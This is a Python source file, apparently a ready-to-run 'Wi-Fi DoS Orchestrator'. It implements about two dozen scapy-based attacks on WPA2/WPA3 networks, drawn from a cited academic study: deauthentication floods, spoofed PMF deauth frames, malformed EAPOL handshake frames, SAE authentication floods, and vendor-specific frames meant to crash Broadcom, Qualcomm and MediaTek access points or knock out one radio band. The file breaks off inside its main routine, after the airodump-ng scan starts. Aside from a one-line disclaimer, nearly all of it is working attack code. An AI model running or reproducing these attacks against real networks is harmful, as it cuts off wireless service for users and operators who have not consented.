#!/usr/bin/env python3
"""
================================================================================
Wi-Fi DoS Orchestrator - COMPLETE ARSENAL (26 Attacks)
================================================================================
Based on: "How is your Wi-Fi connection today? DoS attacks on WPA3-SAE"
Journal of Information Security and Applications (2022)

FOR EDUCATIONAL PURPOSES AND AUTHORIZED SECURITY TESTS ONLY!
================================================================================
"""

import subprocess
import time
import os
import sys
import glob
import random
from multiprocessing import Process, Value

# =====================================================================================
# ======================== CENTRAL CONFIGURATION ======================================
# =====================================================================================

# --- 1. TARGET DATA ---
TARGET_BSSID_5GHZ = "AA:BB:CC:DD:EE:11"
TARGET_BSSID_2_4GHZ = "AA:BB:CC:DD:EE:11"

# --- 2. SAE PARAMETERS (EXTRACTED VIA WIRESHARK) ---
# IMPORTANT: Enter DIFFERENT values for 2.4 GHz and 5 GHz!

# > Parameters for 2.4 GHz Network
SAE_SCALAR_2_4_HEX = 'INSERT_2_4_SCALAR_HERE' # Example: '49f7dcc4fb5725917c2ba1412ff42123f2dc699a0950db0828fe9d01c9786b80'
SAE_FINITE_2_4_HEX = 'INSERT_2_4_FINITE_HERE' # Example: '8632644e22320b3b9943f62e52df25de17b8833c03b11c4cc403aebdf7d0b2c68607dc39a2891e0e8243b4990e493a25abc8ce6ebad06da0e201879f966c6518'

# > Parameters for 5 GHz Network
SAE_SCALAR_5_HEX = 'INSERT_5_SCALAR_HERE'
SAE_FINITE_5_HEX = 'INSERT_5_FINITE_HERE'

# --- 3. SCANNER / MANUAL CHANNELS ---
SCANNER_INTERFACE = "wlan0mon"  # e.g. "wlan1mon"
MANUELLER_KANAL_5GHZ = "36"
MANUELLER_KANAL_2_4GHZ = "1"

# --- 4. TARGET CLIENTS (MANUAL ASSIGNMENT) ---

# Clients for GENERAL attacks (deauth_flood, pmf_deauth_exploit, malformed...)
TARGET_STA_MACS = [
#    "AA:BB:CC:DD:EE:11",         Remove # to set the MAC address!
#    "AA:BB:CC:DD:EE:11",
#    "AA:BB:CC:DD:EE:11"
]

# GROUP A: TARGET IS 5 GHz (The 5 GHz band should crash)
# These attacks require MAC addresses of clients currently on 5 GHz.
# - case6_radio_confusion (Standard)
# - case13_radio_confusion_mediatek_reverse (Reverse)
TARGET_STA_MACS_5GHZ_SPECIAL = [
#    "AA:BB:CC:DD:EE:11",       Remove # to set the MAC address!
#    "AA:BB:CC:DD:EE:11",
#    "AA:BB:CC:DD:EE:11"
]

# GROUP B: TARGET IS 2.4 GHz (The 2.4 GHz band should crash)
# These attacks require MAC addresses of clients currently on 2.4 GHz.
# - case6_radio_confusion_reverse (Reverse)
# - case13_radio_confusion_mediatek (Standard)
TARGET_STA_MACS_2_4GHZ_SPECIAL = [
#    "AA:BB:CC:DD:EE:11",         Remove # to set the MAC address!
#    "AA:BB:CC:DD:EE:11",     
#    "AA:BB:CC:DD:EE:11"
]
# ====================== COMPLETE ENCYCLOPEDIA OF ATTACKS ======================
#
# --- Category: Client Direct Attacks ---
#
# "deauth_flood": Classic deauth attack for forcible disconnection.
# "pmf_deauth_exploit": Exploits the PMF protection mechanism against the client. 
# Phase 1: Preparation (The main attack)
#
#    You start one of your DoS attacks (e.g., back_to_the_future, open_auth, or amplification).
#
#    Goal: The CPU and/or memory of the router are so heavily loaded that it reacts very slowly or not at all to new requests. The router is now "weakened".
#
# Phase 2: The Trigger (The Exploit)
#
#    Your pmf_deauth_exploit process sends a single, unprotected deauthentication frame. It spoofs the router's MAC address.
#
# "malformed_msg1_length", "malformed_msg1_flags": Attacks the client driver via the 4-Way Handshake.
#
# --- Category: Generic WPA3-SAE Attacks (from Section 4 of the study) ---
#
# "bad_algo": Sends authentication frames with an invalid algorithm value.
# "bad_seq": Sends SAE frames with an invalid sequence number.
# "bad_status_code": Sends SAE confirm frames with an invalid status code.
# "empty_frame_confirm": Sends empty SAE confirm frames.
#
# --- Category: Vendor Specific Attacks (from Section 6 of the study) ---
#
# "case1_denial_of_internet": Disconnects a client from the internet by deleting its session on the AP. Broadcom.
# "case2_bad_auth_algo_broadcom": Uses invalid algorithm values to disrupt Broadcom APs. Broadcom.
# "case3_bad_status_code": Sends SAE confirm frames with an invalid status code. Broadcom.
# "case4_bad_send_confirm": Manipulates the "Send-Confirm" counter in SAE confirm frames. Broadcom.
# "case5_empty_frame": Sends empty SAE confirm frames. Broadcom.
# "case6_radio_confusion": Confuses dual-band drivers. Purpose: Crashes the 5 GHz band. Broadcom.
# "case6_radio_confusion_reverse": Inverse logic of Case 6. Purpose: Crashes the 2.4 GHz band. Broadcom.
# "case7_back_to_the_future": Overloads WPA2 APs with WPA3 packets. Broadcom.
# "case8_bad_auth_algo_qualcomm": Like Case II, but tailored to Qualcomm chipsets. Qualcomm.
# "case9_bad_sequence_number": Uses invalid sequence numbers in authentication frames. Qualcomm.
# "case10a_bad_auth_body_empty": Sends authentication frames with an empty body. Qualcomm.
# "case10b_bad_auth_body_payload": Sends authentication frames with a faulty payload. Qualcomm.
# "case11_seq_status_fuzz": Performs a fuzzing attack with varying sequence and status codes. Qualcomm.
# "case12_bursty_auth": Sends authentication frames in bursts to force MediaTek APs to reboot. MediaTek.
# "case13_radio_confusion_mediatek": Confuses MediaTek drivers. Purpose: Crashes the 2.4 GHz band.
# "case13_radio_confusion_mediatek_reverse": Inverse logic of Case 13. Purpose: Crashes the 5 GHz band.
#
###############################################################################################################################################
    # TARGET: 5 GHz Crash (Broadcom APs)
    # IMPORTANT: Adapter must be on 2.4 GHz because we "shoot" from there
#    "wlan7mon": {"band": "2.4GHz", "angriff": "case6_radio_confusion"},
#
    # TARGET: 5 GHz Crash (MediaTek APs)
    # IMPORTANT: Adapter must be on 2.4 GHz
#    "wlan6mon": {"band": "2.4GHz", "angriff": "case13_radio_confusion_mediatek_reverse"}     
######################################################################################################
    # TARGET: 2.4 GHz Crash (Broadcom APs)
    # IMPORTANT: Adapter must be on 5 GHz to attack from there
#    "wlan7mon": {"band": "5GHz", "angriff": "case6_radio_confusion_reverse"},
#
    # TARGET: 2.4 GHz Crash (MediaTek APs)
    # IMPORTANT: Adapter must be on 5 GHz
#    "wlan6mon": {"band": "5GHz", "angriff": "case13_radio_confusion_mediatek"}     
# 
#
# Conclusion for your configuration
#
# You don't need to remember why this is, just what your target is. The logic actually "crosses" due to historical documentation:
#
#    Case 6 (Standard) = Case 13 (Reverse) = Both crash 5 GHz.
#
#    Case 6 (Reverse) = Case 13 (Standard) = Both crash 2.4 GHz.
# ==============================================================================================
# --- 5. ADAPTER & ATTACK CONFIGURATION ---
ADAPTER_KONFIGURATION = {
#   "wlan1mon": {"band": "5GHz", "angriff": "case13_radio_confusion_mediatek"}, # Remove # so set! 
    "wlan2mon": {"band": "5GHz", "angriff": "case6_radio_confusion_reverse"},
#   "wlan3mon": {"band": "2.4GHz", "angriff": "case6_radio_confusion"},         # Remove # so set! 
    "wlan4mon": {"band": "2.4GHz", "angriff": "case6_radio_confusion"}
}

# =====================================================================================
# ======================== HELPER FUNCTIONS ========================
# =====================================================================================

def set_channel(interface, channel):
    try:
        subprocess.run(['iw', 'dev', interface, 'set', 'channel', str(channel)], check=True, capture_output=True, text=True, timeout=5)
        time.sleep(0.1)
        return True
    except (subprocess.CalledProcessError, subprocess.TimeoutExpired):
        try:
            subprocess.run(['iwconfig', interface, 'channel', str(channel)], check=True, capture_output=True, text=True)
            time.sleep(0.1)
            return True
        except:
            print(f"[ERROR] Could not set channel {channel} on {interface}")
            return False

def get_target_info_from_csv(csv_file_path, all_target_stas):
    info = {'aps': {}, 'clients': {'5ghz': [], '2.4ghz': []}}
    try:
        with open(csv_file_path, 'r', errors='ignore') as f: lines = f.readlines()
        for line in lines:
            parts = [p.strip() for p in line.split(',')]
            if len(parts) >= 4:
                bssid = parts[0].upper()
                if bssid == TARGET_BSSID_5GHZ:
                    info['aps']['5ghz'] = {'bssid': bssid, 'channel': parts[3]}
                elif bssid == TARGET_BSSID_2_4GHZ:
                    info['aps']['2.4ghz'] = {'bssid': bssid, 'channel': parts[3]}
    except Exception: pass
    return info

def cleanup(proc_dict):
    print("\n[INFO] Cleaning up and terminating all processes...")
    for proc in proc_dict.values():
        if proc and isinstance(proc, (Process, subprocess.Popen)):
            try:
                if isinstance(proc, Process) and proc.is_alive(): proc.terminate()
                elif isinstance(proc, subprocess.Popen) and proc.poll() is None: proc.kill()
            except Exception: pass
    for f in glob.glob("scan_result*"):
        try: os.remove(f)
        except OSError: pass
    print("[INFO] Cleanup completed.")

# =====================================================================================
# ======================== ATTACK FUNCTIONS (ALL 26) ========================
# =====================================================================================

# --- Vendor Specific Attacks ---

def run_case1_denial_of_internet_process(interface, counter, **kwargs):
    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth
    bssid, channel, clients = kwargs['bssid'], kwargs['channel'], kwargs.get('clients', [])
    if not clients: return
    print(f"\n[INFO-CASE1] {interface}: Starting Denial of Internet on channel {channel}...")
    if not set_channel(interface, channel): return
    SAE_PAYLOAD = b'\x13\x00' + bytes.fromhex(kwargs['scalar_hex']) + bytes.fromhex(kwargs['finite_hex'])
    try:
        while True:
            for client in clients:
                packet = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=3, seqnum=1, status=0)/SAE_PAYLOAD
                sendp(packet, iface=interface, verbose=0)
                with counter.get_lock(): counter.value += 1
            time.sleep(10)
    except KeyboardInterrupt: pass

def run_case2_bad_auth_algo_broadcom_process(interface, counter, **kwargs):
    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth, RandMAC
    bssid, channel = kwargs['bssid'], kwargs['channel']
    if not set_channel(interface, channel): return
    try:
        while True:
            packet = RadioTap()/Dot11(addr1=bssid, addr2=str(RandMAC()), addr3=bssid)/Dot11Auth(algo=5, seqnum=1, status=0)
            sendp(packet, count=20, inter=0.005, iface=interface, verbose=0)
            with counter.get_lock(): counter.value += 20
            time.sleep(0.5)
    except KeyboardInterrupt: pass

def run_case3_bad_status_code_process(interface, counter, **kwargs):
    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth
    bssid, channel, clients = kwargs['bssid'], kwargs['channel'], kwargs.get('clients', [])
    if not clients: return
    print(f"\n[INFO-CASE3] {interface}: Starting Bad Status Code...")
    if not set_channel(interface, channel): return
    try:
        while True:
            for client in clients:
                PAYLOAD = b'\x00\x00' + os.urandom(32)
                packet = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=3, seqnum=2, status=77)/PAYLOAD
                sendp(packet, count=200, inter=0.01, iface=interface, verbose=0)
                with counter.get_lock(): counter.value += 200
            time.sleep(1)
    except KeyboardInterrupt: pass

def run_case4_bad_send_confirm_process(interface, counter, **kwargs):
    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth
    bssid, channel, clients = kwargs['bssid'], kwargs['channel'], kwargs.get('clients', [])
    if not clients: return
    print(f"\n[INFO-CASE4] {interface}: Starting Bad Send-Confirm...")
    if not set_channel(interface, channel): return
    try:
        while True:
            for client in clients:
                PAYLOAD = b'\x11\x11' + os.urandom(32)
                packet = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=3, seqnum=2, status=0)/PAYLOAD
                sendp(packet, count=200, inter=0.01, iface=interface, verbose=0)
                with counter.get_lock(): counter.value += 200
            time.sleep(1)
    except KeyboardInterrupt: pass

def run_case5_empty_frame_process(interface, counter, **kwargs):
    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth
    bssid, channel, clients = kwargs['bssid'], kwargs['channel'], kwargs.get('clients', [])
    if not clients: return
    print(f"\n[INFO-CASE5] {interface}: Starting Empty Frame...")
    if not set_channel(interface, channel): return
    try:
        while True:
            for client in clients:
                packet = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=3, seqnum=2, status=0)
                sendp(packet, count=200, inter=0.01, iface=interface, verbose=0)
                with counter.get_lock(): counter.value += 200
            time.sleep(1)
    except KeyboardInterrupt: pass

def run_case6_radio_confusion_process(interface, counter, **kwargs):
    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth
    # Target is 5GHz, so we need 5GHz params, even if we shoot from 2.4GHz
    bssid_5ghz, channel_5ghz = kwargs['bssid_5ghz'], kwargs['channel_5ghz']
    bssid_2_4ghz, channel_2_4ghz = kwargs['bssid_2_4ghz'], kwargs['channel_2_4ghz']
    clients_5ghz = kwargs.get('clients', [])
    if not (bssid_5ghz and channel_5ghz and bssid_2_4ghz and channel_2_4ghz and clients_5ghz): return
    print(f"\n[INFO-CASE6] {interface}: Starting Radio Confusion (Target 5GHz)...")
    # This attack uses the SAE payload valid for the TARGET band (5GHz)
    SAE_PAYLOAD = b'\x13\x00' + bytes.fromhex(kwargs['scalar_hex']) + bytes.fromhex(kwargs['finite_hex'])
    try:
        while True:
            if set_channel(interface, channel_2_4ghz):
                for client in clients_5ghz:
                    packet = RadioTap()/Dot11(addr1=bssid_2_4ghz, addr2=client, addr3=bssid_2_4ghz)/Dot11Auth(algo=3, seqnum=1, status=0)/SAE_PAYLOAD
                    sendp(packet, count=100, inter=0.01, iface=interface, verbose=0)
                    with counter.get_lock(): counter.value += 100
            
            if set_channel(interface, channel_5ghz):
                for source_mac in clients_5ghz + [bssid_2_4ghz]:
                    packet = RadioTap()/Dot11(addr1=bssid_5ghz, addr2=source_mac, addr3=bssid_5ghz)/Dot11Auth(algo=3, seqnum=1, status=0)/SAE_PAYLOAD
                    sendp(packet, count=50, inter=0.01, iface=interface, verbose=0)
                    with counter.get_lock(): counter.value += 50
            time.sleep(2)
    except KeyboardInterrupt: pass

def run_case6_radio_confusion_reverse_process(interface, counter, **kwargs):
    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth
    # Target is 2.4GHz, so we need 2.4GHz params
    bssid_5ghz, channel_5ghz = kwargs['bssid_5ghz'], kwargs['channel_5ghz']
    bssid_2_4ghz, channel_2_4ghz = kwargs['bssid_2_4ghz'], kwargs['channel_2_4ghz']
    clients_2_4ghz = kwargs.get('clients', [])
    if not (bssid_5ghz and channel_5ghz and bssid_2_4ghz and channel_2_4ghz and clients_2_4ghz): return
    print(f"\n[INFO-CASE6-REV] {interface}: Starting Radio Confusion (Target 2.4GHz)...")
    SAE_PAYLOAD = b'\x13\x00' + bytes.fromhex(kwargs['scalar_hex']) + bytes.fromhex(kwargs['finite_hex'])
    try:
        while True:
            if set_channel(interface, channel_5ghz):
                for client in clients_2_4ghz:
                    packet = RadioTap()/Dot11(addr1=bssid_5ghz, addr2=client, addr3=bssid_5ghz)/Dot11Auth(algo=3, seqnum=1, status=0)/SAE_PAYLOAD
                    sendp(packet, count=100, inter=0.01, iface=interface, verbose=0)
                    with counter.get_lock(): counter.value += 100

            if set_channel(interface, channel_2_4ghz):
                for source_mac in clients_2_4ghz + [bssid_5ghz]:
                    packet = RadioTap()/Dot11(addr1=bssid_2_4ghz, addr2=source_mac, addr3=bssid_2_4ghz)/Dot11Auth(algo=3, seqnum=1, status=0)/SAE_PAYLOAD
                    sendp(packet, count=50, inter=0.01, iface=interface, verbose=0)
                    with counter.get_lock(): counter.value += 50
            time.sleep(2)
    except KeyboardInterrupt: pass

def run_case7_back_to_the_future_process(interface, counter, **kwargs):
    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth, RandMAC
    bssid, channel = kwargs['bssid'], kwargs['channel']
    if not set_channel(interface, channel): return
    print(f"\n[INFO-CASE7] {interface}: Starting Back to the Future...")
    SAE_PAYLOAD = b'\x13\x00' + bytes.fromhex(kwargs['scalar_hex']) + bytes.fromhex(kwargs['finite_hex'])
    try:
        print(f"[INFO-CASE7] {interface}: Phase 1, Memory Flooding...")
        for i in range(600): # According to study ~3 minutes
            packet = RadioTap()/Dot11(addr1=bssid, addr2=str(RandMAC()), addr3=bssid)/Dot11Auth(algo=3, seqnum=1, status=0)/SAE_PAYLOAD
            sendp(packet, count=128, inter=0.001, iface=interface, verbose=0)
            with counter.get_lock(): counter.value += 128
            time.sleep(0.2)
        
        clients = kwargs.get('clients', [])
        if clients:
            print(f"[INFO-CASE7] {interface}: Phase 2, targeting clients...")
            while True:
                for client in clients:
                    packet = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=3, seqnum=1, status=0)/SAE_PAYLOAD
                    sendp(packet, iface=interface, verbose=0)
                    with counter.get_lock(): counter.value += 1
                time.sleep(0.1)
    except KeyboardInterrupt: pass

def run_case8_bad_auth_algo_qualcomm_process(interface, counter, **kwargs):
    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth
    bssid, channel, clients = kwargs['bssid'], kwargs['channel'], kwargs.get('clients', [])
    if not clients: return
    print(f"\n[INFO-CASE8] {interface}: Starting Bad Auth Algo (Qualcomm)...")
    if not set_channel(interface, channel): return
    try:
        while True:
            for client in clients:
                packet = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=random.choice([0] + list(range(7, 100))), seqnum=1, status=0)
                sendp(packet, count=40, inter=0.01, iface=interface, verbose=0)
                with counter.get_lock(): counter.value += 40
            time.sleep(1)
    except KeyboardInterrupt: pass

def run_case9_bad_sequence_number_process(interface, counter, **kwargs):
    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth
    bssid, channel, clients = kwargs['bssid'], kwargs['channel'], kwargs.get('clients', [])
    if not clients: return
    print(f"\n[INFO-CASE9] {interface}: Starting Bad Sequence Number...")
    if not set_channel(interface, channel): return
    SAE_PAYLOAD = b'\x13\x00' + bytes.fromhex(kwargs['scalar_hex']) + bytes.fromhex(kwargs['finite_hex'])
    try:
        while True:
            for client in clients:
                packet = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=random.choice([0, 3]), seqnum=3, status=0)/SAE_PAYLOAD
                sendp(packet, count=20, inter=0.01, iface=interface, verbose=0)
                with counter.get_lock(): counter.value += 20
            time.sleep(1)
    except KeyboardInterrupt: pass

def run_case10a_bad_auth_body_empty_process(interface, counter, **kwargs):
    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth
    bssid, channel, clients = kwargs['bssid'], kwargs['channel'], kwargs.get('clients', [])
    if not clients: return
    print(f"\n[INFO-CASE10A] {interface}: Starting Bad Auth Body (Empty)...")
    if not set_channel(interface, channel): return
    try:
        while True:
            for client in clients:
                packet = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=random.randint(1, 65535))
                sendp(packet, count=100, inter=0.01, iface=interface, verbose=0)
                with counter.get_lock(): counter.value += 100
            time.sleep(1)
    except KeyboardInterrupt: pass

def run_case10b_bad_auth_body_payload_process(interface, counter, **kwargs):
    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth
    bssid, channel, clients = kwargs['bssid'], kwargs['channel'], kwargs.get('clients', [])
    if not clients: return
    print(f"\n[INFO-CASE10B] {interface}: Starting Bad Auth Body (Payload)...")
    if not set_channel(interface, channel): return
    BAD_PAYLOAD = bytes.fromhex('1300b8263a4b72b42638691b47d442785f92ab519b3eff598563c3a3e1914446990b05afd3996a922b6ede4f5f063ecbbe83ee10e9778f8d118b6eed76b97b8d29d7d4d2275704c1a2ff018234deef54e6806ee083b04c27028dcebf71df73e79296')
    try:
        while True:
            for client in clients:
                packet = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=random.randint(1, 65535))/BAD_PAYLOAD
                sendp(packet, count=100, inter=0.01, iface=interface, verbose=0)
                with counter.get_lock(): counter.value += 100
            time.sleep(1)
    except KeyboardInterrupt: pass

def run_case11_seq_status_fuzz_process(interface, counter, **kwargs):
    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth
    bssid, channel, clients = kwargs['bssid'], kwargs['channel'], kwargs.get('clients', [])
    if not clients: return
    print(f"\n[INFO-CASE11] {interface}: Starting Seq/Status Fuzzing...")
    if not set_channel(interface, channel): return
    try:
        client = clients[0]
        for seq_num in range(2):
            status_code = 0
            for i in range(1000):
                if i % 100 == 0: status_code = (status_code % 11) + 1
                packet = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=0, seqnum=seq_num, status=status_code)
                sendp(packet, iface=interface, verbose=0)
                with counter.get_lock(): counter.value += 1
                time.sleep(0.04)
        print(f"[INFO-CASE11] {interface}: Fuzzing cycle completed.")
        time.sleep(10) # Pause before repeating
    except KeyboardInterrupt: pass

def run_case12_bursty_auth_process(interface, counter, **kwargs):
    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth
    bssid, channel, clients = kwargs['bssid'], kwargs['channel'], kwargs.get('clients', [])
    if not clients: return
    print(f"\n[INFO-CASE12] {interface}: Starting Bursty Auth (MediaTek)...")
    if not set_channel(interface, channel): return
    try:
        while True:
            for client in clients:
                for algo in range(1, 5):
                    packet = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=algo, seqnum=1, status=0)
                    sendp(packet, count=100, inter=0.01, iface=interface, verbose=0)
                    with counter.get_lock(): counter.value += 100
            time.sleep(1)
    except KeyboardInterrupt: pass

def run_case13_radio_confusion_mediatek_process(interface, counter, **kwargs):
    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth
    bssid_5ghz, channel_5ghz = kwargs.get('bssid_5ghz'), kwargs.get('channel_5ghz')
    clients = kwargs.get('clients', [])
    if not (bssid_5ghz and channel_5ghz and clients): return
    print(f"\n[INFO-CASE13] {interface}: Starting MediaTek Radio Confusion (Target 2.4GHz)...")
    if not set_channel(interface, channel_5ghz): return
    SAE_PAYLOAD = b'\x13\x00' + bytes.fromhex(kwargs['scalar_hex']) + bytes.fromhex(kwargs['finite_hex'])
    try:
        while True:
            for client in clients:
                packet = RadioTap()/Dot11(addr1=bssid_5ghz, addr2=client, addr3=bssid_5ghz)/Dot11Auth(algo=3, seqnum=1, status=0)/SAE_PAYLOAD
                sendp(packet, count=128, inter=0.01, iface=interface, verbose=0)
                with counter.get_lock(): counter.value += 128
            time.sleep(1)
    except KeyboardInterrupt: pass

def run_case13_radio_confusion_mediatek_reverse_process(interface, counter, **kwargs):
    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth
    bssid_2_4ghz, channel_2_4ghz = kwargs.get('bssid_2_4ghz'), kwargs.get('channel_2_4ghz')
    clients = kwargs.get('clients', [])
    if not (bssid_2_4ghz and channel_2_4ghz and clients): return
    print(f"\n[INFO-CASE13-REV] {interface}: Starting MediaTek Radio Confusion (Target 5GHz)...")
    if not set_channel(interface, channel_2_4ghz): return
    SAE_PAYLOAD = b'\x13\x00' + bytes.fromhex(kwargs['scalar_hex']) + bytes.fromhex(kwargs['finite_hex'])
    try:
        while True:
            for client in clients:
                packet = RadioTap()/Dot11(addr1=bssid_2_4ghz, addr2=client, addr3=bssid_2_4ghz)/Dot11Auth(algo=3, seqnum=1, status=0)/SAE_PAYLOAD
                sendp(packet, count=128, inter=0.01, iface=interface, verbose=0)
                with counter.get_lock(): counter.value += 128
            time.sleep(1)
    except KeyboardInterrupt: pass

# --- Client Direct Attacks ---

def run_deauth_flood_process(interface, counter, **kwargs):
    from scapy.all import sendp, RadioTap, Dot11, Dot11Deauth
    bssid, channel, clients = kwargs.get('bssid'), kwargs.get('channel'), kwargs.get('clients', [])
    if not clients: return
    print(f"[INFO-DEAUTH] {interface}: Starting Deauth Flood...")
    if not set_channel(interface, channel): return
    client_index = 0
    try:
        while True:
            client = clients[client_index % len(clients)]
            p1 = RadioTap()/Dot11(addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
            p2 = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Deauth(reason=7)
            sendp([p1, p2], count=64, inter=0.005, iface=interface, verbose=0)
            with counter.get_lock(): counter.value += 128
            client_index += 1
            time.sleep(1)
    except KeyboardInterrupt: pass

def run_pmf_deauth_exploit_process(interface, counter, **kwargs):
    from scapy.all import sendp, RadioTap, Dot11, Dot11Deauth
    bssid, channel, clients = kwargs.get('bssid'), kwargs.get('channel'), kwargs.get('clients', [])
    if not clients: return
    print(f"[INFO-PMF] {interface}: Starting PMF Deauth Exploit...")
    if not set_channel(interface, channel): return
    client_index = 0
    try:
        while True:
            client = clients[client_index % len(clients)]
            packet = RadioTap()/Dot11(addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=3)
            sendp(packet, count=60, inter=0.02, iface=interface, verbose=0)
            with counter.get_lock(): counter.value += 60
            client_index += 1
            time.sleep(1)
    except KeyboardInterrupt: pass

def run_malformed_msg1_process(interface, counter, **kwargs):
    from scapy.all import sendp, RadioTap, Dot11, EAPOL
    bssid, channel, clients = kwargs.get('bssid'), kwargs.get('channel'), kwargs.get('clients', [])
    if not clients: return
    print(f"[INFO-MALFORMED] {interface}: Starting Malformed MSG1...")
    if not set_channel(interface, channel): return
    client_index = 0
    try:
        while True:
            client = clients[client_index % len(clients)]
            payload = b'\x02\x03\x00\x5f\x02\x00\x8a\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x01' + (b'\x00' * 80)
            packet = RadioTap()/Dot11(type=2, subtype=8, addr1=client, addr2=bssid, addr3=bssid)/EAPOL(version=1, type=3)/payload
            sendp(packet, count=10, inter=0.01, iface=interface, verbose=0)
            with counter.get_lock(): counter.value += 10
            client_index += 1
            time.sleep(1)
    except KeyboardInterrupt: pass

# --- Generic WPA3-SAE Attacks ---

def run_bad_algo_generic_process(interface, counter, **kwargs):
    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth, RandMAC
    bssid, channel = kwargs.get('bssid'), kwargs.get('channel')
    if not set_channel(interface, channel): return
    print(f"[INFO-BAD-ALGO] {interface}: Starting Bad Algo (Generic)...")
    try:
        while True:
            packet = RadioTap()/Dot11(addr1=bssid, addr2=str(RandMAC()), addr3=bssid)/Dot11Auth(algo=random.choice([0,1,2,4,5]))
            sendp(packet, count=20, inter=0.005, iface=interface, verbose=0)
            with counter.get_lock(): counter.value += 20
            time.sleep(0.5)
    except KeyboardInterrupt: pass

def run_bad_seq_generic_process(interface, counter, **kwargs):
    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth, RandMAC
    bssid, channel = kwargs.get('bssid'), kwargs.get('channel')
    if not set_channel(interface, channel): return
    print(f"[INFO-BAD-SEQ] {interface}: Starting Bad Seq (Generic)...")
    SAE_PAYLOAD = b'\x13\x00' + bytes.fromhex(kwargs['scalar_hex']) + bytes.fromhex(kwargs['finite_hex'])
    try:
        while True:
            packet = RadioTap()/Dot11(addr1=bssid, addr2=str(RandMAC()), addr3=bssid)/Dot11Auth(algo=3, seqnum=random.choice([0,3,4]))/SAE_PAYLOAD
            sendp(packet, count=20, inter=0.005, iface=interface, verbose=0)
            with counter.get_lock(): counter.value += 20
            time.sleep(0.5)
    except KeyboardInterrupt: pass

def run_bad_status_code_generic_process(interface, counter, **kwargs):
    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth, RandMAC
    bssid, channel = kwargs.get('bssid'), kwargs.get('channel')
    if not set_channel(interface, channel): return
    print(f"[INFO-BAD-STATUS-GENERIC] {interface}: Starting Bad Status (Generic)...")
    try:
        while True:
            packet = RadioTap()/Dot11(addr1=bssid, addr2=str(RandMAC()), addr3=bssid)/Dot11Auth(algo=3, seqnum=2, status=random.randint(108, 200))
            sendp(packet, count=20, inter=0.005, iface=interface, verbose=0)
            with counter.get_lock(): counter.value += 20
            time.sleep(0.5)
    except KeyboardInterrupt: pass

def run_empty_frame_confirm_generic_process(interface, counter, **kwargs):
    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth, RandMAC
    bssid, channel = kwargs.get('bssid'), kwargs.get('channel')
    if not set_channel(interface, channel): return
    print(f"[INFO-EMPTY-GENERIC] {interface}: Starting Empty Frame (Generic)...")
    try:
        while True:
            packet = RadioTap()/Dot11(addr1=bssid, addr2=str(RandMAC()), addr3=bssid)/Dot11Auth(algo=3, seqnum=2, status=0)
            sendp(packet, count=20, inter=0.005, iface=interface, verbose=0)
            with counter.get_lock(): counter.value += 20
            time.sleep(0.5)
    except KeyboardInterrupt: pass

def run_cookie_guzzler_process(interface, counter, **kwargs):
    """Cookie Guzzler: SAE Flooding to trigger Anti-Clogging"""
    from scapy.all import sendp, RadioTap, Dot11, Dot11Auth, RandMAC
    bssid, channel = kwargs.get('bssid'), kwargs.get('channel')
    if not set_channel(interface, channel): return
    print(f"[INFO-COOKIE] {interface}: Starting Cookie Guzzler...")
    SAE_PAYLOAD = b'\x13\x00' + bytes.fromhex(kwargs['scalar_hex']) + bytes.fromhex(kwargs['finite_hex'])
    try:
        while True:
            packet = RadioTap()/Dot11(type=0, subtype=11, addr1=bssid, addr2=str(RandMAC()), addr3=bssid)/Dot11Auth(algo=3, seqnum=1, status=0)/SAE_PAYLOAD
            sendp(packet, count=128, inter=0.0001, iface=interface, verbose=0)
            with counter.get_lock(): counter.value += 128
    except KeyboardInterrupt: pass

# =====================================================================================
# ======================== MAIN FUNCTION ========================
# =====================================================================================

def main():
    if os.geteuid() != 0: sys.exit("[ERROR] This script must be run with sudo privileges.")
    
    print("\n" + "="*80 + "\nWi-Fi DoS Orchestrator - Complete Arsenal with Scanner\n" + "="*80)
    
    cleanup({})
    
    current_ap_targets = {}
    current_client_targets = {'5ghz': [], '2.4ghz': []}
    procs = {}
    counters = {iface: Value('i', 0) for iface in ADAPTER_KONFIGURATION}

    try:
        if SCANNER_INTERFACE:
            print(f"[INFO] Starting channel & client scan with {SCANNER_INTERFACE}...")
            scanner_proc = subprocess.Popen(['airodump-ng', SCANNER_INTERFACE, '--band', 'abg', '--write', 'scan_result', '--output-format', 'csv'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            procs['scanner'] = scanner_proc
            
            scan_duration = 90
